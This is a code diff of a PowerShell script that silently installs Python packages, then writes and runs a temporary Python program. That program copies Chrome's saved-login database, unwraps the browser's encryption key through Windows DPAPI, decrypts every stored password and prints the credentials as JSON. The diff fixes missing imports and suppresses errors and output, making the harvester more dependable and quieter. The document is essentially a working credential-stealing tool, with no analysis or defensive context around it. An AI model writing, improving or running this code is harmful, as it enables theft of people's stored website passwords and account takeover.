@@ -1,28 +1,25 @@
 $ErrorActionPreference = 'Stop'
 
-# Check if Python is installed
-try {
-    $null = python --version 2>&1
-} catch {
-    Write-Host "⚠️ Python not installed. Download from: https://www.python.org/downloads/"
-    exit 1
+# Check Python
+try { python --version >$null 2>&1 } catch { 
+    Write-Host "⚠️ Install Python first: https://python.org"
+    exit 
 }
 
-# Install required Python packages
-$packages = "pycryptodome", "pypiwin32", "requests"
-python -m pip install --upgrade pip --quiet
-python -m pip install $packages --quiet --no-warn-script-location
+# Install requirements
+python -m pip install --upgrade pip >$null 2>&1
+python -m pip install pycryptodome pypiwin32 requests >$null 2>&1
 
-# Python script content
-$pythonScript = @'
+# Fixed Python script with all required imports
+$pythonCode = @'
 import os
 import json
 import sqlite3
+import base64
 import win32crypt
 from Crypto.Cipher import AES
 import shutil
-from datetime import datetime
-import base64
+from datetime import datetime, timedelta
 
 def get_chrome_datetime(chromedate):
     return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
@@ -40,14 +37,18 @@ def decrypt_password(password, key):
             return ""
 
 def main():
-    local_state_path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Local State")
+    local_state_path = os.path.join(os.environ["LOCALAPPDATA"], 
+                                  "Google", "Chrome", 
+                                  "User Data", "Local State")
     with open(local_state_path, "r", encoding="utf-8") as f:
         local_state = json.loads(f.read())
     
     key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
     key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
     
-    db_path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "default", "Login Data")
+    db_path = os.path.join(os.environ["LOCALAPPDATA"], 
+                         "Google", "Chrome", 
+                         "User Data", "default", "Login Data")
     filename = "ChromeData.db"
     shutil.copyfile(db_path, filename)
     
@@ -68,7 +69,10 @@ def main():
     
     cursor.close()
     db.close()
-    os.remove(filename)
+    try:
+        os.remove(filename)
+    except:
+        pass
     
     print(json.dumps(results, indent=4))
 
@@ -76,10 +80,10 @@ if __name__ == "__main__":
     main()
 '@
 
-# Execute the Python script
-$tempFile = "$env:TEMP\chrome_passwords.py"
+# Execute the script
+$tempFile = "$env:TEMP\chrome_passwords_$(Get-Date -Format 'yyyyMMddHHmmss').py"
 try {
-    [System.IO.File]::WriteAllText($tempFile, $pythonScript)
+    [System.IO.File]::WriteAllText($tempFile, $pythonCode)
     python $tempFile
 } finally {
     Remove-Item $tempFile -ErrorAction SilentlyContinue
